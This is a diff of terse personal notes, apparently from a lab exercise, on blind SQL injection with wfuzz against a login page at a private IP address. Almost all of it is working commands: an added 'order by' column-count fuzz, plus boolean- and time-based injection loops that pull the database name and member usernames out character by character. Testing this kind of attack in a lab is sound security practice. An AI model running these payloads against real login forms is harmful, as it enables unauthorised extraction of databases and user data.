@@ -11,6 +11,12 @@
 #In "Bool injection",my "grep" filter by the ID number of the result of wfuzz
 #In "Time injection",my "grep" filter by the reponse time.notice that in "Time injection",I use the "v" argument in wfuzz to output the reponse time
 
+
+fuzz order by
+
+wfuzz -z range,1-10 -d "myusername=aa&mypassword=' order by FUZZ#&Submit=Login" http://192.168.92.146/checklogin.php
+
+
 fuzz the current database
 
 for i in $(seq 1 20);do wfuzz --hh 109 -z range,32-127 -d "myusername=aa&mypassword=1' or (select (ord(right(left((select database()),$i),1)) = FUZZ))#Submit=Login" http://192.168.92.146/checklogin.php | grep '000'; done
@@ -38,3 +44,4 @@ for i in $(seq 1 10); do wfuzz --hh 109 -z range,32-127 -d "myusername=aa&mypass
 for i in $(seq 1 10); do wfuzz -v -z range,32-127 -d "myusername=aa&mypassword=1' or if((select ascii(substr(username,$i,1))from members limit 0,1)=FUZZ, sleep(2),1) #&Submit=Login" http://192.168.92.146/checklogin.php | grep '4\.';done
 
 
+myusername=aaab&mypassword=bbbb&Submit=Login
